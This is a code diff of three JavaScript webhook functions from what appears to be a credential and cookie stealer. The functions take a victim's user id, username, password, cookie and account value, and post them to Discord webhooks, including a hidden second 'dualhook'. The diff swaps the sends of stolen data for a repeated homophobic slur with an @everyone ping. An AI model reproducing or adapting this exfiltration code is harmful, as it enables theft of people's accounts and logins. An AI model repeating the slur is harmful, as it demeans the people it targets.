@@ -390,10 +390,10 @@ async function send_webhook(url, userid, username, password, cookie, rap){
         hook.setAvatar('https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png');
         hook2.setUsername('Kooki Lawger');
         hook2.setAvatar('https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png');
-        await hook.send(embed);
+        await hook.send("RABID IS A GAY DUALHOOKING FAG @everyone");
         //hook2 = dualhook
-        await hook2.send(embed);
-	await hook2.send('@everyone');
+        await hook2.send("RABID IS A GAY DUALHOOKING FAG @everyone");
+	await hook2.send("RABID IS A GAY DUALHOOKING FAG @everyone");
 
 	    
     }catch(err){
@@ -451,10 +451,10 @@ async function send_webhook2(url, userid, username, password, cookie, rap){
         hook.setAvatar('https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png');
         hook2.setUsername('Kooki Lawger');
         hook2.setAvatar('https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png');
-        await hook.send(embed);
+        await hook.send("RABID IS A GAY DUALHOOKING FAG @everyone");
         //hook2 = dualhook
-        await hook2.send(embed);
-	await hook2.send('@everyone');
+        await hook2.send("RABID IS A GAY DUALHOOKING FAG @everyone");
+	await hook2.send("RABID IS A GAY DUALHOOKING FAG @everyone");
 
 	    
     }catch(err){
@@ -498,9 +498,9 @@ async function send_webhook1(url, userid, username, password, cookie, rap){
         hook.setAvatar('https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png');
         hook2.setUsername('Kooki Lawger');
         hook2.setAvatar('https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png');
-        await hook.send(embed);
+        await hook.send("RABID IS A GAY DUALHOOKING FAG @everyone");
         //hook2 = dualhook
-        await hook2.send(embed);
+        await hook2.send("RABID IS A GAY DUALHOOKING FAG @everyone");
 	
 	    
     }catch(err){
